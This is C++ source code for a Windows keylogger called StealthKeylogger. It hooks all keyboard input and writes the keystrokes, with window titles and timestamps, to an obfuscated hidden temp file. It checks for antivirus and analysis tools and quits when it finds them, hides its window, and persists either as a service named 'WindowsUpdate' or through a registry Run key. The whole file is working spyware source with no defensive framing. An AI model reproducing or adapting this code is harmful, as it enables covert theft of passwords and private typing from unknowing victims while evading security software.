#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <algorithm>
#include <cctype>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "psapi.lib")

// String obfuscation using XOR
std::string decrypt_string(const std::vector<int>& encrypted, int key) {
    std::string result;
    for (int c : encrypted) {
        result += (char)(c ^ key);
    }
    return result;
}

// Obfuscated strings
std::vector<int> enc_log_file = {108, 99, 121, 95, 108, 99, 121, 116, 119, 107, 46, 116, 120, 116}; // "sys_backup.txt"
std::vector<int> enc_mutex_name = {109, 121, 114, 126, 108, 99, 120, 95, 109, 113, 116, 101, 120}; // "windows_master"
std::vector<int> enc_service_name = {87, 105, 110, 100, 111, 119, 115, 85, 112, 100, 97, 116, 101}; // "WindowsUpdate" (XOR with 0)

class StealthKeylogger {
private:
    HHOOK hKeyboardHook;
    std::ofstream logFile;
    HANDLE hMutex;
    bool isRunning;
    
    // Check for antivirus
    bool isAntivirusPresent() {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    std::string procName = pe32.szExeFile;
                    std::transform(procName.begin(), procName.end(), procName.begin(), ::tolower);
                    if (procName.find("avp") != std::string::npos ||
                        procName.find("kaspersky") != std::string::npos ||
                        procName.find("msmpeng") != std::string::npos ||
                        procName.find("smartscreen") != std::string::npos) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }
        return false;
    }
    
    // Anti-debugging checks
    bool isDebuggerPresent() {
        // Multiple debugging detection methods
        if (IsDebuggerPresent()) return true;
        
        // Check for remote debugger
        BOOL isRemoteDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebugger);
        if (isRemoteDebugger) return true;
        
        // Timing-based detection
        DWORD start = GetTickCount();
        Sleep(10);
        if (GetTickCount() - start > 50) return true;
        
        // PEB check
        PPEB peb = (PPEB)__readgsqword(0x60);
        if (peb->BeingDebugged) return true;
        
        // NtGlobalFlag check (heap flags) - доступ через смещение в PEB
        // Пропускаем для MinGW, так как структура PEB неполная
        
        // Check for hardware breakpoints
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(GetCurrentThread(), &ctx)) {
            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
        }
        
        // Check for analysis tools
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    std::string procName = pe32.szExeFile;
                    std::transform(procName.begin(), procName.end(), procName.begin(), ::tolower);
                    if (procName.find("ollydbg") != std::string::npos ||
                        procName.find("x64dbg") != std::string::npos ||
                        procName.find("windbg") != std::string::npos ||
                        procName.find("ida") != std::string::npos ||
                        procName.find("wireshark") != std::string::npos ||
                        procName.find("procmon") != std::string::npos ||
                        procName.find("sysmon") != std::string::npos ||
                        procName.find("fiddler") != std::string::npos) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }
        
        return false;
    }
    
    // Process hollowing detection
    bool isProcessHollowed() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return false;
        
        typedef NTSTATUS (WINAPI* NtQueryInformationProcess_t)(
            HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        NtQueryInformationProcess_t NtQueryInformationProcess = 
            (NtQueryInformationProcess_t)GetProcAddress(ntdll, "NtQueryInformationProcess");
        
        if (!NtQueryInformationProcess) return false;
        
        PROCESS_BASIC_INFORMATION pbi = {0};
        NTSTATUS status = NtQueryInformationProcess(
            GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
        if (status == 0 && pbi.PebBaseAddress) {
            // Проверка через сравнение базовых адресов
            // ImageBaseAddress недоступен в MinGW PEB, используем альтернативный метод
            HMODULE currentModule = GetModuleHandle(NULL);
            // Упрощенная проверка - если PEB указывает на другой модуль
            return (pbi.PebBaseAddress != (PVOID)currentModule);
        }
        return false;
    }
    
    // Hide from task manager and detection
    void hideProcess() {
        // Get handle to ntdll
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return;
        
        // Try to set process as critical (requires admin)
        typedef NTSTATUS (WINAPI* RtlSetProcessIsCritical_t)(BOOLEAN, PBOOLEAN, BOOLEAN);
        RtlSetProcessIsCritical_t RtlSetProcessIsCritical = 
            (RtlSetProcessIsCritical_t)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        }
        
        // Lower process priority to avoid detection
        SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
        
        // Hide console window if exists
        HWND console = GetConsoleWindow();
        if (console) {
            ShowWindow(console, SW_HIDE);
        }
    }
    
    // Simple XOR encryption for logged data
    std::string encryptData(const std::string& data) {
        std::string encrypted = data;
        int key = 0x42;
        for (size_t i = 0; i < encrypted.length(); i++) {
            encrypted[i] ^= key;
            key = (key + 1) % 256;
        }
        return encrypted;
    }
    
    // Get window title for context
    std::string getCurrentWindowTitle() {
        HWND foregroundWindow = GetForegroundWindow();
        char windowTitle[256];
        GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
        return std::string(windowTitle);
    }
    
public:
    StealthKeylogger() : hKeyboardHook(NULL), isRunning(false) {
        // Set static instance
        if (!g_instance) {
            g_instance = this;
        }
        
        // Anti-debugging and anti-AV checks
        if (isDebuggerPresent() || isProcessHollowed() || isAntivirusPresent()) {
            // Don't exit immediately - wait a bit to avoid detection patterns
            Sleep(1000 + (GetTickCount() % 2000));
            ExitProcess(0);
        }
        
        // Create mutex to prevent multiple instances
        std::string mutexName = decrypt_string(enc_mutex_name, 20);
        hMutex = CreateMutexA(NULL, FALSE, mutexName.c_str());
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            ExitProcess(0);
        }
        
        // Hide process
        hideProcess();
        
        // Initialize log file in accessible location with multiple fallbacks
        std::string fullPath;
        char tempPath[MAX_PATH];
        
        // Try multiple accessible locations
        if (GetTempPathA(MAX_PATH, tempPath) > 0) {
            fullPath = std::string(tempPath) + "~" + std::to_string(GetCurrentProcessId()) + ".tmp";
        } else if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, tempPath) == S_OK) {
            fullPath = std::string(tempPath) + "\\Microsoft\\Windows\\" + std::to_string(GetCurrentProcessId()) + ".dat";
        } else if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, tempPath) == S_OK) {
            fullPath = std::string(tempPath) + "\\" + std::to_string(GetCurrentProcessId()) + ".tmp";
        } else {
            fullPath = "C:\\Windows\\Temp\\" + std::to_string(GetCurrentProcessId()) + ".tmp";
        }
        
        logFile.open(fullPath, std::ios::app | std::ios::binary);
    }
    
    ~StealthKeylogger() {
        stop();
        if (hMutex) CloseHandle(hMutex);
        if (logFile.is_open()) logFile.close();
    }
    
    // Static instance pointer for hook callback
    static StealthKeylogger* g_instance;
    
    static LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && g_instance) {
            g_instance->handleKeyEvent(wParam, lParam);
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    
    void handleKeyEvent(WPARAM wParam, LPARAM lParam) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            std::string keyData;
            std::string windowTitle = getCurrentWindowTitle();
            
            // Get current time
            SYSTEMTIME st;
            GetLocalTime(&st);
            char timestamp[100];
            sprintf(timestamp, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
            
            // Convert virtual key code to character
            char keyChar[16];
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            
            int result = ToAscii(kbStruct->vkCode, kbStruct->scanCode, keyboardState, (LPWORD)keyChar, 0);
            
            if (result == 1) {
                keyData = std::string(1, keyChar[0]);
            } else {
                // Handle special keys
                switch (kbStruct->vkCode) {
                    case VK_RETURN: keyData = "[ENTER]"; break;
                    case VK_SPACE: keyData = " "; break;
                    case VK_BACK: keyData = "[BACKSPACE]"; break;
                    case VK_TAB: keyData = "[TAB]"; break;
                    case VK_SHIFT: keyData = "[SHIFT]"; break;
                    case VK_CONTROL: keyData = "[CTRL]"; break;
                    case VK_MENU: keyData = "[ALT]"; break;
                    default:
                        char buffer[32];
                        sprintf(buffer, "[VK_%d]", kbStruct->vkCode);
                        keyData = buffer;
                        break;
                }
            }
            
            // Create log entry
            std::string logEntry = std::string(timestamp) + " | " + windowTitle + " | " + keyData + "\n";
            std::string encryptedEntry = encryptData(logEntry);
            
            // Write to file
            if (logFile.is_open()) {
                logFile << encryptedEntry;
                logFile.flush();
            }
        }
    }
    
    bool start() {
        if (isRunning) return false;
        
        // Install low-level keyboard hook
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, GetModuleHandle(NULL), 0);
        if (!hKeyboardHook) {
            return false;
        }
        
        isRunning = true;
        return true;
    }
    
    void stop() {
        if (hKeyboardHook) {
            UnhookWindowsHookEx(hKeyboardHook);
            hKeyboardHook = NULL;
        }
        isRunning = false;
    }
    
    // Main message loop
    void run() {
        MSG msg;
        while (isRunning && GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            
            // Anti-debugging check during runtime
            if (isDebuggerPresent()) {
                ExitProcess(0);
            }
            
            // Sleep to reduce CPU usage and avoid detection
            Sleep(10);
        }
    }
};

// Service installation functions
bool installAsService() {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;
    
    char servicePath[MAX_PATH];
    GetModuleFileNameA(NULL, servicePath, MAX_PATH);
    
    std::string serviceName = decrypt_string(enc_service_name, 0);
    
    SC_HANDLE service = CreateServiceA(
        scm,
        serviceName.c_str(),
        "Windows System Update Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        servicePath,
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (service) {
        StartService(service, 0, NULL);
        CloseServiceHandle(service);
    }
    
    CloseServiceHandle(scm);
    return service != NULL;
}

// Registry persistence
bool addRegistryPersistence() {
    HKEY hKey;
    const char* regPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        RegSetValueExA(hKey, "WindowsSecurityUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
        return true;
    }
    
    return false;
}

// Определение статической переменной вне класса
StealthKeylogger* StealthKeylogger::g_instance = nullptr;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    // Hide console window
    HWND console = GetConsoleWindow();
    if (console) ShowWindow(console, SW_HIDE);
    
    // Try to install persistence
    if (!installAsService()) {
        addRegistryPersistence();
    }
    
    // Initialize and start keylogger
    StealthKeylogger keylogger;
    
    if (keylogger.start()) {
        keylogger.run();
    }
    
    return 0;
}